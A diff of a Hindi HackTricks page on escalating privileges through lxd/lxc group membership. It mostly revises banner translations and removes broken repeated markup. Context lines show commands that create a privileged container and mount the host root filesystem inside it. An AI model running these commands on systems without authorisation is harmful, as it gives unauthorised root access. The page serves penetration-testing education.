@@ -1,16 +1,16 @@
 # lxd/lxc समूह - विशेषाधिकार वृद्धि
 
 {% hint style="success" %}
-AWS हैकिंग सीखें और अभ्यास करें:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP हैकिंग सीखें और अभ्यास करें: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+सीखें और अभ्यास करें AWS हैकिंग:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+सीखें और अभ्यास करें GCP हैकिंग: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricks का समर्थन करें</summary>
 
 * [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
-* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमारा अनुसरण करें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।
+* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर **फॉलो करें**.
+* हैकिंग ट्रिक्स साझा करें और [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks क्लाउड**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें.
 
 </details>
 {% endhint %}
@@ -62,7 +62,7 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 {% hint style="danger" %}
-यदि आप इस त्रुटि को पाते हैं _**त्रुटि: कोई स्टोरेज पूल नहीं मिला। कृपया एक नया स्टोरेज पूल बनाएं**_\
+यदि आप यह त्रुटि _**त्रुटि: कोई स्टोरेज पूल नहीं मिला। कृपया एक नया स्टोरेज पूल बनाएं**_\
 **`lxd init`** चलाएं और **पिछले आदेशों के समूह को दोहराएं**
 {% endhint %}
 
@@ -93,118 +93,18 @@ lxc init myimage mycontainer -c security.privileged=true
 
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
-
-<div data-gb-custom-block data-tag="hint" data-style='success'>
-
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+```
+{% hint style="success" %}
+सीखें और AWS हैकिंग का अभ्यास करें:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+सीखें और GCP हैकिंग का अभ्यास करें: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>HackTricks का समर्थन करें</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
-
-</div>
+* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
+* **हमारे साथ जुड़ें** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
+* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।
 
 </details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</div>
-
-</details>
-
-</div>
-```
-
+{% endhint %}
